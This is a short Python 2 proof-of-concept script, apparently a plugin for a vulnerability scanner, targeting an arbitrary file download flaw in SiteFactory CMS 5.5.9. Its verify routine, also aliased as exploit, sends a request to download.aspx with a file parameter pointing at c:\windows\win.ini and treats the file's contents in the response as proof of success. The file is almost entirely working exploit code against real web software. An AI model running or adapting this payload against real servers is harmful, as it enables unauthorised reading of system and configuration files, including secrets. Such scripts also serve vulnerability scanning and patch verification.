#!/usr/bin/env python
# coding=utf-8

import urllib2, urllib

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc':{
            'id': 'poc-2015-0130',
            'name': 'SiteFactory CMS 5.5.9 任意文件下载漏洞 PoC',
            'author': 'ali',
            'create_data': '2015-08-25',
            },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
            },
        # 漏洞相关信息
        'vul': {
            'app_name': 'SiteFactory',
            'vul_versiosn': ['5.5.9'],
            'type': 'Arbitrary File Download',
            'tag': ['SiteFactory', 'Arbitrary File Download', 'sitefactory/assets/download.aspx?file='],
            'desc': 'SiteFactory CMS 5.5.9任意文件下载漏洞',
            'references': ['https://www.bugscan.net/#!/x/22441'],
            },
    }

    @classmethod
    def verify(cls, args):
        payload = ('/sitefactory/assets/download.aspx?file=c%3a\windows\win.ini')
        verify_url = args['options']['target'] + payload
        req = urllib2.urlopen(verify_url)
        statecode = urllib.urlopen(verify_url).getcode()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = req.read()
        if statecode == 200 and '[fonts]' in content and '[files]' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())